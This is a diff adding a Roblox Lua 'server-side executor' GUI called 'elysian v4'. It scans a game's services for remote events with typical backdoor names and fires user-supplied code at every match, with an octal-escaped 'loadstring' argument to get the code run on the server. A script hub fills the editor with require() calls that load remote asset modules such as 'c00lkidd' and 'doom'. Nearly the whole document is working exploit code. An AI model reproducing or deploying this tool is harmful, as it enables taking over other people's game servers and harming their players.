@@ -1,0 +1,235 @@
+local lp = game:GetService("Players").LocalPlayer
+local pGui = lp:WaitForChild("PlayerGui")
+if pGui:FindFirstChild("ELYSIAN_V4_FINAL_REVISION") then 
+pGui["ELYSIAN_V4_FINAL_REVISION"]:Destroy() 
+end
+local foundRemotes = {}
+local remoteNames = {"MainEvent", "Control", "Handshake", "Remote", "v", "_", "Check", "Request", "ServerEvent", "MainRemote", "RemoteEvent", "RequestEvent"}
+local sg = Instance.new("ScreenGui", pGui)
+sg.Name = "ELYSIAN_V4_FINAL_REVISION"
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sg.ResetOnSpawn = false
+local function customNotify(msg)
+local nf = Instance.new("Frame", sg)
+nf.Size = UDim2.new(0, 200, 0, 40)
+nf.Position = UDim2.new(1, 10, 0.85, 0)
+nf.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+nf.BorderColor3 = Color3.fromRGB(255, 255, 255)
+nf.BorderSizePixel = 1
+local nt = Instance.new("TextLabel", nf)
+nt.Size = UDim2.new(1, -10, 1, 0)
+nt.Position = UDim2.new(0, 5, 0, 0)
+nt.BackgroundTransparency = 1
+nt.Text = msg
+nt.TextColor3 = Color3.fromRGB(255, 255, 255)
+nt.TextSize = 11
+nt.Font = Enum.Font.Code
+nt.TextWrapped = true
+nf:TweenPosition(UDim2.new(1, -210, 0.85, 0), "Out", "Quad", 0.3, true)
+task.delay(3, function()
+if nf then
+nf:TweenPosition(UDim2.new(1, 10, 0.85, 0), "In", "Quad", 0.3, true)
+task.wait(0.3) nf:Destroy()
+end
+end)
+end
+local Main = Instance.new("Frame", sg)
+Main.Name = "MainFrame"
+Main.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+Main.Size = UDim2.new(0.55594, 0, 0.9303, 0)
+Main.Position = UDim2.new(0, 224, 0, -2)
+Main.BorderSizePixel = 0
+Main.Active = true
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+Main.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+dragging = true
+dragStart = input.Position
+startPos = Main.Position
+input.Changed:Connect(function()
+if input.UserInputState == Enum.UserInputState.End then dragging = false end
+end)
+end
+end)
+Main.InputChanged:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+dragInput = input
+end
+end)
+UserInputService.InputChanged:Connect(function(input)
+if input == dragInput and dragging then
+local delta = input.Position - dragStart
+Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+end)
+local TopBar = Instance.new("Frame", Main)
+TopBar.Name = "TopBar"
+TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TopBar.Size = UDim2.new(1, 0, 0.06311, 0)
+TopBar.BorderSizePixel = 0
+local Logo = Instance.new("ImageLabel", TopBar)
+Logo.Image = "rbxassetid://124463065454507"
+Logo.Size = UDim2.new(0.06014, 0, 0.96154, 0)
+Logo.Position = UDim2.new(0, 2, 0, 0)
+Logo.BackgroundTransparency = 1
+local Title = Instance.new("TextLabel", TopBar)
+Title.Text = "elysian v4 "
+Title.Size = UDim2.new(0.16495, 0, 1, 0)
+Title.Position = UDim2.new(0, 39, 0, 0)
+Title.TextXAlignment = "Left"
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.new(0,0,0)
+local Close = Instance.new("TextButton", TopBar)
+Close.Text = "X"
+Close.Size = UDim2.new(0.05, 0, 1, 0)
+Close.Position = UDim2.new(1, -25, 0, 0)
+Close.BackgroundTransparency = 1
+Close.TextColor3 = Color3.new(0,0,0)
+Close.MouseButton1Click:Connect(function() sg:Destroy() end)
+local Small = Instance.new("TextButton", TopBar)
+Small.Text = "__"
+Small.Size = UDim2.new(0.05, 0, 1, 0)
+Small.Position = UDim2.new(1, -55, 0, 0)
+Small.BackgroundTransparency = 1
+Small.TextColor3 = Color3.new(0,0,0)
+local Lab = Instance.new("TextLabel", Main)
+Lab.Text = "executor"
+Lab.TextColor3 = Color3.new(1,1,1)
+Lab.Size = UDim2.new(0.08591, 0, 0.03398, 0)
+Lab.Position = UDim2.new(0, 28, 0, 35)
+Lab.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+Lab.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Lab.BorderSizePixel = 1
+local Box = Instance.new("TextBox", Main)
+Box.Name = "Editor"
+Box.Text = ""
+Box.Size = UDim2.new(0.7457, 0, 0.64078, 0)
+Box.Position = UDim2.new(0, 22, 0, 50)
+Box.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+Box.BorderColor3 = Color3.new(1,1,1)
+Box.TextColor3 = Color3.new(1,1,1)
+Box.MultiLine = true
+Box.TextXAlignment = "Left"
+Box.TextYAlignment = "Top"
+Box.ClearTextOnFocus = false
+local Hub = Instance.new("ScrollingFrame", Main)
+Hub.Name = "ScriptHub"
+Hub.Size = UDim2.new(0.177, 0, 0.87, 0)
+Hub.Position = UDim2.new(0, 466, 0, 36)
+Hub.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+Hub.BorderColor3 = Color3.new(1,1,1)
+Hub.BorderSizePixel = 1
+Hub.ScrollBarThickness = 2
+Hub.AutomaticCanvasSize = "Y"
+local List = Instance.new("UIListLayout", Hub)
+List.Padding = UDim.new(0, 1) -- Jarak antar tombol 1 pixel
+local function AddS(name, scriptCode)
+local b = Instance.new("TextButton", Hub)
+b.Name = name
+b.Text = name .. ".txt"
+b.Size = UDim2.new(1, -5, 0, 13)
+b.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+b.TextColor3 = Color3.new(1,1,1)
+b.BorderSizePixel = 0
+b.TextXAlignment = "Left"
+b.Font = Enum.Font.Code
+b.TextSize = 8
+b.MouseButton1Click:Connect(function()
+local finalCode = scriptCode:gsub("TARGET", lp.Name)
+Box.Text = finalCode
+end)
+end
+AddS("happy hub", "require(109229360070706):Hload('TARGET')")
+AddS("Respawn", "require(3229910984):respawn('TARGET')")
+AddS("polaria", "require(110951620907921):Pload('TARGET')")
+AddS("sensation hub", "require(100263845596551)('TARGET')")
+AddS("RC7", "require(12350030542).RC7('TARGET')")
+AddS("R6", "require(3436957371):r6('TARGET')")
+AddS("SFV3PC", "require(132592022786319).SFV3PC('TARGET')")
+AddS("guns gui", "require(7960756691).load('TARGET')")
+AddS("chat bypass", "require(7960756691).load('TARGET')")
+AddS("coolgui", "require(14125553864):Fire('TARGET','c00lkidd')")
+AddS("excavator", "require(16571914488)('TARGET')")
+AddS("dev-uzi", "require(16662808456):Fire('TARGET','dev-uzi')")
+AddS("uno table", "require(13902025530).Give('TARGET')")
+AddS("jason", "require(93565035610376).jason('TARGET')")
+AddS("doom", "require(2555964157).doom('TARGET')")
+AddS("DNGVDva", "require(109803336108428).DNGVDva('TARGET')")
+AddS("Stratosphere", "require(6535776034).load('TARGET')")
+AddS("APSM", "require(4932247409)('TARGET')")
+AddS("bow", "require(4560072580).load('TARGET')")
+AddS("Katana", "require(12736619973)('TARGET')")
+AddS("Combat", "require(4559973214).load('TARGET')")
+AddS("Crufix", "require(12933040327)('TARGET')")
+local foundRemotes = {} 
+local remoteNames = {"MainEvent", "Control", "Handshake", "Remote", "v", "_", "Check", "Request", "ServerEvent", "MainRemote", "RemoteEvent", "RequestEvent"}
+local function CreateBtn(name, txt, posX)
+local b = Instance.new("TextButton", Main)
+b.Name = name
+b.Text = txt
+b.Size = UDim2.new(0.15, 0, 0.1, 0)
+b.Position = UDim2.new(0, posX, 0, 330) -- Posisi Y di area bawah editor
+b.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+b.BorderColor3 = Color3.new(1,1,1)
+b.TextColor3 = Color3.new(1,1,1)
+b.BorderSizePixel = 1
+b.Font = Enum.Font.Code
+b.TextSize = 10
+return b
+end
+local ExeBtn = CreateBtn("EXE", "EXE", 24)
+local ClearBtn = CreateBtn("CLEAR", "CLEAR", 122)
+local InjectBtn = CreateBtn("INJECT", "INJECT", 220)
+ClearBtn.MouseButton1Click:Connect(function()
+Box.Text = ""
+end)
+InjectBtn.MouseButton1Click:Connect(function()
+foundRemotes = {}
+customNotify("Scanning all services...")
+local paths = {game:GetService("ReplicatedStorage"), game:GetService("JointsService"), game:GetService("Workspace")}
+for _, path in pairs(paths) do
+for _, v in pairs(path:GetDescendants()) do
+if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+for _, n in pairs(remoteNames) do
+if v.Name:lower():find(n:lower()) then
+table.insert(foundRemotes, v)
+break
+end
+end
+end
+end
+end
+customNotify("Success: " .. #foundRemotes .. " backdoors linked!")
+end)
+ExeBtn.MouseButton1Click:Connect(function()
+local code = Box.Text
+if #foundRemotes > 0 and code ~= "" then
+local nf = Instance.new("Frame", sg)
+nf.Size = UDim2.new(0, 250, 0, 40)
+nf.Position = UDim2.new(1, -260, 0.85, 0)
+nf.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+nf.BorderSizePixel = 1
+local nt = Instance.new("TextLabel", nf)
+nt.Size = UDim2.new(1, 0, 1, 0)
+nt.BackgroundTransparency = 1
+nt.TextColor3 = Color3.new(1, 1, 1)
+nt.Font = Enum.Font.Code
+nt.TextSize = 10
+task.spawn(function()
+for i, remote in pairs(foundRemotes) do
+nt.Text = "Firing to remote [" .. i .. "/" .. #foundRemotes .. "]"
+pcall(function()
+remote:FireServer(code)
+remote:FireServer("\108\111\97\100\115\116\114\105\110\103", code)
+end)
+task.wait(0.05) -- Jeda agar angka berubah real-time [cite: 49]
+end
+nt.Text = "Successfully sent to all!"
+task.wait(1)
+nf:Destroy()
+end)
+else
+customNotify("SCAN IT FIRTS IDIOT", Color3.new(1,0,0))
+end
+end)
